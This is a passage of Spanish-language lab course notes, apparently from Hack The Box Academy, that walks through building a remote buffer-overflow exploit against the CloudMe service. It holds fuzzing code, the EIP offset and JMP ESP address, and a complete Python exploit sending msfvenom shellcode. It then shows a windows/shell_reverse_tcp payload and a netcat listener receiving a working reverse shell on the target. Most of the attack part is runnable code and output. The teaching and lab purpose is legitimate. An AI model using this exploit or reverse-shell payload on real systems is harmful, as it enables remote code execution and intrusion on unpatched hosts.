        print("Fuzzing %s bytes" % i)
```

La declaración de impresión nos ayuda a conocer el tamaño actual del búfer de fuzzing para que cuando el programa finalmente falle, sepamos qué longitud provocó el fallo.

A continuación, debemos conectarnos al puerto cada vez y enviarle nuestra carga útil. Para ello, tenemos que importar la `socket` biblioteca como hicimos al principio de nuestro código anterior y, a continuación, establecer una conexión al puerto con la `connect` función, de la siguiente manera:

```python
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, port))
```

Con esto, deberíamos estar listos para enviar nuestro buffer, lo cual podemos hacer a través de `s.send(buffer)`. También necesitaremos envolver nuestro bucle en un `try/except` bloque, de modo que podamos detener la ejecución cuando el programa se bloquee y ya no acepte conexiones. Nuestra `fuzz()`función final debería verse de la siguiente manera:

```python
def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            s.close()
    except:
        print("Could not establish a connection")

fuzz()
```

Ejecutamos nuestro script y vemos lo siguiente:

```cmd-session
Fuzzing 0 bytes
Fuzzing 500 bytes
...SNIP...
Fuzzing 9000 bytes
Fuzzing 9500 bytes
```


Vemos que todo el script se ejecutó sin bloquear los servicios de escucha, ya que el puerto `8888` seguía escuchando durante nuestro análisis de fuzzing. Sin embargo, si verificamos nuestro `x32dbg` depurador, vemos que el `cloudme`programa front-end se bloqueó y `EIP` se sobrescribió con nuestro `A`búfer de :

![](../../Images/Pasted%20image%2020240925165832.png)


Nos enfrentamos a este problema porque nuestro programa nunca deja de enviar cargas útiles, ya que el servicio de escucha nunca se bloquea. Entonces, ¿cómo podríamos saber en qué longitud de búfer se bloqueó el programa?

Podemos enviar nuestro buffer gradualmente agregando un `breakpoint()`después `s.send(buffer)`, de modo que cuando podamos continuar manualmente presionando `c`, podamos ver si nuestra entrada hizo que el programa se bloqueara y sobrescribiera `EIP`.

Entonces, agregaremos nuestro punto de interrupción a nuestro exploit, reiniciaremos el programa en `x32dbg` y comenzaremos a fuzzear gradualmente el programa:

```cmd-session
Fuzzing 0 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(13)fuzz()
-> s.send(buffer)
(Pdb) c
Fuzzing 500 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(12)fuzz()
-> breakpoint()
(Pdb) c
Fuzzing 1000 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(13)fuzz()
-> s.send(buffer)
(Pdb) c
Fuzzing 1500 bytes
> c:\users\htb-student\desktop\win32bof_exploit_remote.py(12)fuzz()
-> breakpoint()
(Pdb) c
...
```

Una vez que el programa falla y `EIP`se sobrescribe, sabemos que la última cantidad de bytes que enviamos es lo que hizo que el programa fallara y que el programa es vulnerable a un desbordamiento de búfer.

## Construyendo un exploit remoto

### Control de EIP

Comenzaremos creando un patrón único `2000` de bytes de longitud, utilizando `ERC --pattern c 2000` como hicimos anteriormente:

![](../../Images/Pasted%20image%2020240925165950.png)

Ahora comenzamos a escribir nuestra `eip_offset()` función. Agregaremos nuestra `pattern` variable como con el patrón `Ascii` en el `Pattern_Create_1.txt`archivo creado en nuestro escritorio, como hicimos con nuestro exploit anterior. Después de eso, para enviar nuestro patrón, podemos usar el mismo código que usamos para fuzzear el puerto:

```python
def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    ...SNIP...
                    "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

eip_offset()
```

Una vez que nuestra `eip_offset()` función esté lista, podemos reiniciar nuestro programa `x32dbg` y ejecutar nuestro código, y nuestro programa debería bloquearse y deberíamos ver `EIP` sobrescrito con nuestro patrón como `316A4230`:

![](../../Images/Pasted%20image%2020240925170022.png)

Ahora podemos usar `ERC --pattern o 1jB0` para calcular el desplazamiento exacto, que se encuentra en `1052` bytes:

![](../../Images/Pasted%20image%2020240925170034.png)

Ahora, para asegurarnos de que podemos controlar el valor exacto en `EIP`, usaremos la misma `eip_control()`función de nuestro exploit anterior (mientras cambiamos `offset`), pero usando `socket`para enviar nuestra carga útil en lugar de escribirla en un archivo:

```python
def eip_control():
    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

eip_control()
```

Reiniciaremos nuevamente nuestro programa y ejecutaremos nuestro exploit, y podremos confirmar que tenemos el control `EIP` ya que sobrescribimos `EIP`con 4 `B`:
### Identificando malos personajes

Nuestro siguiente paso es identificar si debemos evitar el uso de caracteres incorrectos en nuestra entrada. Podemos comenzar ejecutando `ERC --bytearray` in `x32dbg` para crear nuestro `ByteArray_1.bin` archivo. Luego podemos copiar las mismas `bad_chars()` funciones de nuestro exploit anterior y, una vez más, cambiar de escribir la carga útil en un archivo a enviarla al puerto:

```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

Una vez que reiniciamos nuestro programa `x32dbg` y ejecutamos nuestro exploit, podemos usar `ERC --compare` para comparar los bytes en la `ESP` dirección con el `ByteArray_1.bin` archivo:

![](../../Images/Pasted%20image%2020240925170128.png)

Como podemos ver, todos los bytes coinciden entre la memoria y `ByteArray_1.bin`, lo que significa que este programa no tiene ningún carácter incorrecto.

### Cómo encontrar una instrucción de devolución

Ahora que tenemos el control `EIP` y sabemos qué caracteres incorrectos debemos evitar en nuestra carga útil, necesitamos encontrar una instrucción para ejecutar la carga útil que colocaremos en la pila. Una vez más, dado que este programa no tiene ningún carácter incorrecto, podemos usar la `ESP`dirección como nuestra dirección de retorno. (Intente aprovechar el programa usando `ESP` como dirección de retorno).

Sin embargo, preferiremos utilizar una dirección de una instrucción incorporada en el programa para asegurarnos de que se ejecutará en cualquier sistema, ya que estas instrucciones serán las mismas en cualquier sistema. Por lo tanto, primero obtendremos una lista de módulos y bibliotecas cargadas por el programa, y ​​solo consideraremos aquellas que tengan `False`todas las protecciones, que son las siguientes:

```cmd-session
------------------------------------------------------------------------------------------------------------------------ 
Process Name: CloudMe Modules total: 79 
------------------------------------------------------------------------------------------------------------------------ 
 Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name and Path 
------------------------------------------------------------------------------------------------------------------------ 
 0x400000        0x14c0          0x431000    False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\CloudMe.exe 
 0x61b40000      0x1410          0x5f6000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll 
 0x69900000      0x1410          0x1c1000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll 
 0x6d9c0000      0x1410          0x4c000     False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll 
 0x66e00000      0x1410          0x3d000     False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Xml.dll 
 0x6eb40000      0x1410          0x24000     False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libgcc_s_dw2-1.dll 
 0x6fe40000      0x1410          0x17e000    False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libstdc++-6.dll 
 0x64b40000      0x1410          0x1b000     False      False      False      False      False      1,;WinPthreadGC;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll 
 0x6aa80000      0x1410          0x1b7000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll 
```

Como podemos observar, hay varias librerías cargadas por el programa sin protección de memoria, incluido el `CloudMe.exe` propio programa. Para buscarlas todas `JMP ESP`, podemos ir a la `CPU`pestaña y hacer clic derecho, seleccionar `Search For>All Modules>Command`, ingresar `JMP ESP` , y obtendremos una lista de `JMP ESP` instrucciones en los módulos cargados:

![](../../Images/Pasted%20image%2020240925170209.png)

Si no hubiéramos encontrado ningún resultado, podríamos buscar el `FFE4`patrón en todo el módulo o en todos los módulos, como se mostró en una sección anterior. También podemos buscar otras instrucciones útiles, como `54C3`. En nuestro caso, después de hacer doble clic en el primer resultado para asegurarnos de que efectivamente es `JMP ESP`, podemos copiar la dirección `0069D2E5`y usarla en nuestro exploit. (Intenta buscar otras instrucciones y úsalas como dirección de retorno).
### Saltar a Shellcode

Nuestro paso final es explotar el programa, por lo que comenzaremos creando nuestro shellcode con el que `msfvenom` abriremos `calc.exe` como prueba de explotación exitosa:

```shell-session
0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'

...SNIP...
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
...SNIP...
```

Ahora, para crear nuestra función final `exploit()`, primero agregaremos la salida anterior y usaremos la misma `payload` de nuestro exploit anterior (mientras cambiamos `offset` la dirección en `eip`). Finalmente, usaremos el mismo código de `bad_chars()` para enviar nuestra carga útil al puerto:

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
    buf = b""
    ...SNIP...
    buf += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

    offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x0069D2E5)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()
```

Finalmente, podemos ejecutar `CloudMe` (no necesariamente en `x32dbg`) y ejecutar nuestro exploit, y deberíamos ver que se bloquea y debería abrirse una calculadora.
## Explotación remota

omo hemos creado y probado nuestro exploit, ahora podemos intentar ejecutarlo en un servidor remoto real. Podemos usar el mismo exploit en el objetivo real y solo tenemos que cambiar el `IP`y `port`en nuestro script para apuntarlo al nuevo objetivo y cambiar el shellcode que usamos dentro del script a algo que nos envíe un shell inverso.

---

## Código de shell de shell inverso

Primero, necesitamos encontrar la IP de nuestra máquina, a la que debería poder acceder el servidor remoto (en la misma subred de la red):

```shell-session
0xRh4ps00dy@htb[/htb]$ ip -4 a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    ...SNIP...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 10.10.15.10/23 brd 10.10.15.255 scope global tun0
```

La IP que usaremos es `tun0` la IP de , ya que nuestra VM está en la misma `10.10.` subred.

Nota: Debes estar conectado a la VPN para poder interactuar con el servidor remoto, así que descarga la clave de VPN en caso de que quieras ejecutar el exploit desde tu propia máquina. La instancia de PwnBox ya está conectada a la VPN, por lo que deberías poder conectarte al servidor remoto.

A continuación, generaremos el shellcode que nos enviará un shell inverso, el cual podemos obtener con el `windows/shell_reverse_tcp` payload en `msfvenom`, de la siguiente manera:

```shell-session
0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'

...SNIP...
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
...SNIP...
```

Podemos modificar nuestro exploit copiando la salida y usándola en la `exploit()` función de la `buf` variable.
## Explotación remota

Después de esto, podemos iniciar un `netcat` listener para recibir el shell inverso, de la siguiente manera:

```shell-session
0xRh4ps00dy@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Una vez que estemos escuchando, podemos ejecutar nuestra carga útil `python win32bof_exploit_remote.py` y esperar a que el servidor remoto nos envíe un shell inverso si nuestra explotación fue exitosa.

```shell-session
0xRh4ps00dy@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.15.10] from (UNKNOWN) [10.10.10.10] 64539
Microsoft Windows [Version 10.0.19042.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe>whoami
whoami
htb-student
```

Como podemos ver, sin tener acceso local al servidor remoto, hemos explotado con éxito el servicio remoto y hemos recibido un shell inverso. Esto nos muestra que si depuramos correctamente el programa, podemos crear y probar nuestro exploit localmente y luego ejecutarlo en cualquier servidor remoto con el programa vulnerable escuchando conexiones remotas.

# Referencias

https://academy.hackthebox.com/module/89/section/931

